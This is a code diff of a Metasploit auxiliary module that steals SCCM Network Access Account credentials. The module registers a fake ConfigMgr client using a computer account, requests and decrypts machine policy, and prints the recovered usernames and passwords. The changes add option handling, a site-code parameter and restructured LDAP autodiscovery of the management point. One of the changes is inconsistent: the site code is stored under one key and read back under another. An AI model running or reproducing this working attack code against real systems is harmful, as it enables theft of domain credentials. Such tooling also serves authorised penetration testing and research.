@@ -24,9 +24,12 @@ class MetasploitModule < Msf::Auxiliary
           This requires a computer account, which can be added using the samr_account module.
         },
         'Author' => [
+          'xpn',     # Initial research
+          'skelsec', # Initial obfuscation port
           'smashery' # module author
         ],
         'References' => [
+          ['URL', 'https://blog.xpnsec.com/unobfuscating-network-access-accounts/'],
           ['URL', 'https://github.com/Mayyhem/SharpSCCM'],
           ['URL', 'https://github.com/garrettfoster13/sccmhunter']
         ],
@@ -40,9 +43,12 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      OptAddressRange.new('RHOSTS', [ false, 'The domain controller (for autodiscovery). Not required if providing a management point and site code' ]),
+      OptPort.new('RPORT', [ false, 'The LDAP port of the domain controller (for autodiscovery). Not required if providing a management point and site code', 389 ]),
       OptString.new('COMPUTER_USER', [ true, 'The username of a computer account' ]),
       OptString.new('COMPUTER_PASS', [ true, 'The password of the provided computer account' ]),
-      OptString.new('MANAGEMENT_POINT', [ false, 'The management point to use' ]),
+      OptString.new('MANAGEMENT_POINT', [ false, 'The management point (SCCM server) to use' ]),
+      OptString.new('SITE_CODE', [ false, 'The site code to use on the management point' ]),
     ])
   end
 
@@ -59,27 +65,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def find_management_point
-    raw_objects = @ldap.search(base: @base_dn, filter: '(objectclass=mssmsmanagementpoint)', attributes: ['*'])
-    return nil unless raw_objects.any?
-
-    raw_obj = raw_objects.first
-
-    raw_objects.each do |ro|
-      print_status("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
-    end
-
-    if raw_objects.length > 1
-      print_warning("Found more than one Management Point. Using the first (#{raw_obj[:dnshostname].first})")
-    end
-
-    obj = {}
-    obj[:rhost] = raw_obj[:dnshostname].first
-    obj[:sitecode] = raw_obj[:mssmssitecode].first
-
-    obj
-  end
-
-  def run
     ldap_connect do |ldap|
       validate_bind_success!(ldap)
 
@@ -95,52 +80,81 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
       @ldap = ldap
+      raw_objects = @ldap.search(base: @base_dn, filter: '(objectclass=mssmsmanagementpoint)', attributes: ['*'])
+      return nil unless raw_objects.any?
 
-      mp = datastore['MANAGEMENT_POINT']
-      if mp.blank?
-        begin
-          mp = find_management_point
-          fail_with(Failure::NotFound, 'Failed to find management point') unless mp
-        rescue ::IOError => e
-          fail_with(Failure::UnexpectedReply, e.message)
-        end
+      raw_obj = raw_objects.first
+
+      raw_objects.each do |ro|
+        print_good("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
       end
 
-      key, cert = generate_key_and_cert('ConfigMgr Client')
+      if raw_objects.length > 1
+        print_warning("Found more than one Management Point. Using the first (#{raw_obj[:dnshostname].first})")
+      end
 
-      http_opts = {
-        'rhost' => mp[:rhost],
-        'rport' => 80,
-        'username' => datastore['COMPUTER_USER'],
-        'password' => datastore['COMPUTER_PASS'],
-        'headers' => {
-          'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
-          'Accept-Encoding' => 'gzip, deflate',
-          'Accept' => '*/*',
-          'Connection' => 'Keep-Alive'
-        }
-      }
+      obj = {}
+      obj[:rhost] = raw_obj[:dnshostname].first
+      obj[:sitecode] = raw_obj[:mssmssitecode].first
 
-      sms_id = register_request(http_opts, mp, key, cert)
-      duration = 5
-      print_status("Waiting #{duration} seconds for SCCM DB to update...")
-      sleep(duration)
-      naa_policy_url = get_policies(http_opts, mp, key, cert, sms_id)
-      decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
-      results = get_creds_from_policy_doc(decrypted_policy)
+      obj
+    rescue Errno::ECONNRESET
+      fail_with(Failure::Disconnected, 'The connection was reset.')
+    rescue Rex::ConnectionError => e
+      fail_with(Failure::Unreachable, e.message)
+    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      fail_with(Failure::NoAccess, e.message)
+    rescue Net::LDAP::Error => e
+      fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+    end
+  end
 
-      results.each do |username, password|
-        print_good("Found valid NAA creds: #{username}:#{password}")
+  def run
+    management_point = datastore['MANAGEMENT_POINT']
+    site_code = datastore['SITE_CODE']
+    if management_point.blank? != site_code.blank?
+      fail_with(Failure::BadConfig, 'Provide both MANAGEMENT_POINT and SITE_CODE, or neither (to perform autodiscovery)')
+    end
+
+    if management_point.blank?
+      begin
+        result = find_management_point
+        fail_with(Failure::NotFound, 'Failed to find management point') unless result
+        management_point = result[:rhost]
+        site_code = result[:site_code]
+      rescue ::IOError => e
+        fail_with(Failure::UnexpectedReply, e.message)
       end
     end
-  rescue Errno::ECONNRESET
-    fail_with(Failure::Disconnected, 'The connection was reset.')
-  rescue Rex::ConnectionError => e
-    fail_with(Failure::Unreachable, e.message)
-  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
-    fail_with(Failure::NoAccess, e.message)
-  rescue Net::LDAP::Error => e
-    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+
+
+    key, cert = generate_key_and_cert('ConfigMgr Client')
+
+    http_opts = {
+      'rhost' => management_point,
+      'rport' => 80,
+      'username' => datastore['COMPUTER_USER'],
+      'password' => datastore['COMPUTER_PASS'],
+      'headers' => {
+        'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
+        'Accept-Encoding' => 'gzip, deflate',
+        'Accept' => '*/*'
+      }
+    }
+
+    sms_id = register_request(http_opts, management_point, key, cert)
+    duration = 5
+    print_status("Waiting #{duration} seconds for SCCM DB to update...")
+
+    sleep(duration)
+
+    naa_policy_url = get_policies(http_opts, management_point, site_code, key, cert, sms_id)
+    decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
+    results = get_creds_from_policy_doc(decrypted_policy)
+
+    results.each do |username, password|
+      print_good("Found valid NAA creds: #{username}:#{password}")
+    end
   end
 
   def request_policy(http_opts, policy_url, sms_id, key)
@@ -182,7 +196,7 @@ class MetasploitModule < Msf::Auxiliary
     if key_encryption_alg == Rex::Proto::CryptoAsn1::OIDs::OID_RSAES_OAEP.value
       decrypted_key = key.private_decrypt(encrypted_rsa_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
     else
-      fail_with(Failure::UnexpectedReply, "Unexpected key encryption routine: #{key_encryption_alg}")
+      fail_with(Failure::UnexpectedReply, "Key encryption routine is currently unsupported: #{key_encryption_alg}")
     end
 
     cea = cms_envelope[:encrypted_content_info][:content_encryption_algorithm]
@@ -202,20 +216,19 @@ class MetasploitModule < Msf::Auxiliary
 
       decrypted = cipher.update(body) + cipher.final
     else
-      fail_with(Failure::UnexpectedReply, "Unsupported decryption routine: #{cea[:algorithm].value}")
+      fail_with(Failure::UnexpectedReply, "Decryption routine is currently unsupported: #{cea[:algorithm].value}")
     end
 
     decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
   end
 
-  def get_policies(http_opts, mp, key, cert, sms_id)
+  def get_policies(http_opts, management_point, site_code, key, cert, sms_id)
     computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
     fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
     hex_pub_key = make_ms_pubkey(cert.public_key)
     guid = SecureRandom.uuid.upcase
     sent_time = Time.now.utc.iso8601
-    site_code = mp[:sitecode]
-    sccm_host = mp[:rhost].downcase
+    sccm_host = management_point.downcase
     request_assignments = "<RequestAssignments SchemaVersion=\"1.00\" ACK=\"false\" RequestType=\"Always\"><Identification><Machine><ClientID>GUID:#{sms_id}</ClientID><FQDN>#{fqdn}</FQDN><NetBIOSName>#{computer_user}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:#{site_code}</PolicySource><Resource ResourceType=\"Machine\" /><ServerCookie /></RequestAssignments>\x00"
     request_assignments.encode!('utf-16le')
     body_length = request_assignments.bytes.length
@@ -272,7 +285,7 @@ class MetasploitModule < Msf::Auxiliary
     result.unpack('H*')[0]
   end
 
-  def register_request(http_opts, mp, key, cert)
+  def register_request(http_opts, management_point, key, cert)
     pub_key = cert.to_der.unpack('H*')[0].upcase
 
     computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
@@ -289,7 +302,7 @@ class MetasploitModule < Msf::Auxiliary
     body_length = rr_utf16.length
     rr_utf16 << "\r\n"
 
-    header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{5DD100CD-DF1D-45F5-BA17-A327F43465F8}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>#{mp[:rhost].downcase}</TargetHost><Timeout>60000</Timeout></Msg>"
+    header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{5DD100CD-DF1D-45F5-BA17-A327F43465F8}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>#{management_point.downcase}</TargetHost><Timeout>60000</Timeout></Msg>"
 
     message = Rex::MIME::Message.new
     message.bound = 'aAbBcCdDv1234567890VxXyYzZ'
